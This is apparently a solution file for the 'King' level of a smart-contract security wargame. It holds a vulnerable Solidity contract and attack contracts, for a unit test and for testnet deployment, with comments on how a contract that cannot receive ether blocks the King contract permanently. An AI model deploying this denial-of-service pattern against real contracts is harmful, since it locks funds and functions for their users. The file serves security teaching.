// SPDX-License-Identifier: MIT

// exercise code updated for > 0.8.0 solc
pragma solidity ^0.8.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}


// solution used by unit test
// see https://solidity-by-example.org/sending-ether/
// a contract must implement receive() or fallback() functions
// in order to receive ether transfers.
// if a contract without receive() or fallback() becomes the king, then
// King contract will always crash at king.transfer(msg.value) as it will
// fail to pay the prize to the previous king (attack contract)
// so attack contract will be king forever!
contract KingAttack {
   King king;

  constructor(address payable _king) {
    king =  King(_king);
  }

  function attack() public payable {
    address payable kingAddress = payable(address(king));
    (bool sent, ) = kingAddress.call{value: msg.value}("");
    require(sent, "Failed to send Ether to King contract");
  }
}


// solution used to deploy live to testnet
pragma solidity ^0.8.0;

// vulnerable contract stub with required function
contract KingLive {}

// attack contract
contract KingAttackLive {
  // todo: change this address to your vulnerable contract instance address
  // before deploying this file to testnet via remix
  address payable KING_ADDRESS = payable(0x2D518d5C434c73878d71161E880C517F5e39c8DB);

  KingLive king;

  constructor() {
    king = KingLive(KING_ADDRESS);
  }

  function attack() public payable {
    address payable kingAddress = payable(address(king));
    (bool sent, ) = kingAddress.call{value: msg.value}("");
    require(sent, "Failed to send Ether to King contract");
  }
}
